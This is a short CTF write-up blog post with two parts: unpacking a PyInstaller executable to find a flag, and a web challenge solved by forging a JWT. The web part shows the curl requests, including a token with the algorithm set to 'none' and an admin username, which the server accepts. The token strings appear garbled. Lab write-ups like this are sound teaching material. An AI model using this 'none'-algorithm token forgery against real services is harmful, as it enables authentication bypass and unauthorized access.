---
title: "Polycc CTF Final 2025"
date: 2025-07-14 
categories: [WEB,REVERSING]
tags: [CTF]
image:
  path: https://wallpapers.com/images/high/cool-dramatic-sosuke-aizen-3gq9d7n1zs22yxuz.webp


description: Reverse Engineering Walkthrough and Web Exploitation
  
---
## 🧩 Reverse Engineering 

## Challenge Description 
Dont be fooled by the initial display; the flag shown when the program executes isn't the actual target .Your task is to uncover it by examining the depth of the executable's internal structure.There is something somewhere in Backend. 

## 💥 Exploit Analysis  

![can u](/assets/img/die.png) 

This file showing was packed by pyinstaller to exe file by using Pyinstaller Extractor Web to get the source code in python .

![can u](/assets/img/soul.png) 

```
Flag : ctfcw{wow_you_beat_me}
```

## 🌐 Web Exploitation  

## Challenge Description : None 

## Just Weird Thoughts

![can u](/assets/img/web-none.png)

# 💥 Exploit Analysis 

# 🕵️‍♀️ Source Code Analysis

<br>

```
try {
const tokenResponse = await fetch("/get_token");
const tokenData = await tokenResponse.json();
currentToken = tokenData.token;

const loginResponse = await fetch("/login", {
method: "POST",
headers: {
"Content-Type": "application/json",
},
body: JSON.stringify({ magic_token: currentToken }),
});

const loginData = await loginResponse.json();

if (loginResponse.ok) {
if (loginData.flag) {
showMessage(
"Success! " +
loginData.message +
"\n\nFlag: " +
loginData.flag,
"success"
);
} else {
showMessage("Logged in successfully!", "success");
}
} else {
showMessage("Access restricted: " + loginData.message, "error");
}
} catch (error) {
showMessage("Error: " + error.message, "error");
};

function showMessage(message, type) {
resultMessage.textContent = message;
resultMessage.className = "result-message";
resultMessage.classList.add(type + "-message");
resultMessage.style.display = "block";
}
;
```

```
const tokenResponse = await fetch("/get_token");
```

 
 By visiting /get_token will provide JWT Token .

```
$ curl http://35.185.184.31:3000/get_token
{"token":"eyJhb6c101JU2I1M15InR5cc16ItpXVCJ9 eyJpZCf6N8wIdXNLcm5hbMUiO1JDVzT1X IVzZX11LCJpYXQ10JESNTI2NDW2NZESImV4CCf6NTcIMjY0WzI3Wx0 idUM4RLrExfqt1a6RDevs3Tqa qDp11xovqq14wq384"}
```

I tried to change this earlier since on username : “CW25_Admin” only but looks its like required me to have the secret key i tried to find all the way the secret key and could find it and bruteforcing all the way . so I tried disable the alg and maybe the server are vulnerable to JWT Algorithm Confusion Attack .

```
[Kafka@faris]--[~]
$ curl -X POST http://35.185.184.31:3000/login \
> -H "Content-Type: application/json" \
> -d '{"magic_token":"eyJhb6c101Jub251I1wIdHlWljoiSldUrno eyJpZCf6N8wIdXNLcm5hbMUi O1JDVzT1X0FKbMU1uHaMF01joXkUyNjQzNjcxLCJ1eHA10jESNTI2NDcyNzF9."}'
{"flag":"CW25(CW25_CW25_CW25_CW25_CW25_!!!!!!)","message":"Congratulations ! You've solved the challenge!"}
```


```
Flag : ctfcw{CW25CW25_CW25_CW25_CW25_CW25_!!!!!!}
```







 









